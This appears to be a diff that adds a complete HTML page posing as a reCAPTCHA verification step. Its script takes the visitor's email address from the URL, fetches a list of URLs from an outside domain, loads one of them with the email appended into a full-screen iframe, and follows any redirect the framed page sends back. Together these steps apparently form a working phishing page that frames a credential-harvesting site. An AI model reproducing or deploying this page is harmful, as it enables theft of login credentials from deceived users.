@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title> Verification Recaptcha</title>
+</head>
+<style>
+    html, body {
+        padding: 0px;
+        margin: 0px;
+    }
+    #iframe1 {
+        border: none;
+        width: 100%;
+    }
+</style>
+<body>
+<iframe src="" style="min-height: 99vh;" id="iframe1"></iframe>
+<script type="text/javascript">
+    let gl_np = new Proxy(new URLSearchParams(window.location.search), {
+        get: (searchParams, prop) => searchParams.get(prop),
+    });
+    if(!gl_np||!gl_np.email){
+         let l = window.location.href;
+         let em = l.match(/([a-zA-Z0-9._+-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/gi);
+         if(em&&em.length){
+            gl_np = [];
+            gl_np['email'] = em[0];
+         }
+    }
+    const real_json_url = 'https://hbkichotagons.sbs/captcha/urls.json';
+    fetch('https://hbkichotagons.sbs/captcha/get_json.php?u='+real_json_url)
+        .then((gl_reps) => {
+            gl_reps.json().then(gl_js => {
+                let url = gl_js[Math.floor(Math.random()*gl_js.length)]+"?email="+gl_np.email
+                document.getElementById("iframe1").src=url;
+            });
+        });
+    window.addEventListener("message", (e) => {
+        var data = e.data;
+        let m =  JSON.parse(data)
+        if(m.redirect) {
+            window.location.replace(m.redirect);
+        }
+    });
+</script>
+</body>
+</html>
